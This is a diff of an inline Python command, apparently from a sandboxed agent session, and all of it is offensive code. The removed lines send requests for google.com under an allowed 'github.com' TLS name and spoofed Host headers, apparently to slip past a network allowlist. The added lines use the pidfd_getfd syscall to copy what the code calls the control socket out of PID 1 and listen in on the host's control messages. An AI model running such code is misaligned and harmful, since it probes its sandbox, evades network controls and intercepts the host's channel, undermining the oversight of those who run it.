@@ -1,36 +1,32 @@
 python3 -c "
-import socket, ssl
+import os, socket, ctypes, select, time
 
-# Test 1: Host header injection via absolute URI
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(5)
-s.connect(('142.250.80.46', 443))
-context = ssl.create_default_context()
-context.check_hostname = False
-context.verify_mode = ssl.CERT_NONE
-ss = context.wrap_socket(s, server_hostname='github.com')  # Permitted SNI
-ss.send(b'GET https://www.google.com/ HTTP/1.1\r\nHost: github.com\r\nConnection: close\r\n\r\n')
-data = ss.recv(1024)
-print(f'Absolute URI test: {data[:150]}')
-ss.close()
+libc = ctypes.CDLL(None)
+PID = 1
 
-# Test 2: Double Host header
-s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s2.settimeout(5)
-s2.connect(('142.250.80.46', 443))
-ss2 = context.wrap_socket(s2, server_hostname='github.com')
-ss2.send(b'GET / HTTP/1.1\r\nHost: github.com\r\nHost: www.google.com\r\nConnection: close\r\n\r\n')
-data2 = ss2.recv(1024)
-print(f'Double Host test: {data2[:150]}')
-ss2.close()
+# Steal the control socket
+pidfd = os.pidfd_open(PID, 0)
+dup_fd = libc.syscall(438, pidfd, 11, 0)
+os.close(pidfd)
 
-# Test 3: Host with port
-s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s3.settimeout(5)
-s3.connect(('142.250.80.46', 443))
-ss3 = context.wrap_socket(s3, server_hostname='github.com')
-ss3.send(b'GET / HTTP/1.1\r\nHost: github.com:443\r\nConnection: close\r\n\r\n')
-data3 = ss3.recv(1024)
-print(f'Host with port: {data3[:150]}')
-ss3.close()
-" 2>/dev/null
+s = socket.socket(fileno=dup_fd)
+s.setblocking(False)
+
+# Race-read: try to capture the next control message from the host
+print('Listening for control messages for 5 seconds...')
+start = time.time()
+captured = []
+while time.time() - start < 5:
+    ready, _, _ = select.select([s], [], [], 0.5)
+    if ready:
+        try:
+            data = s.recv(4096)
+            if data:
+                captured.append(data)
+                print(f'Captured {len(data)} bytes: {data[:50].hex()}')
+        except:
+            pass
+
+print(f'Total captures: {len(captured)}')
+s.close()
+"
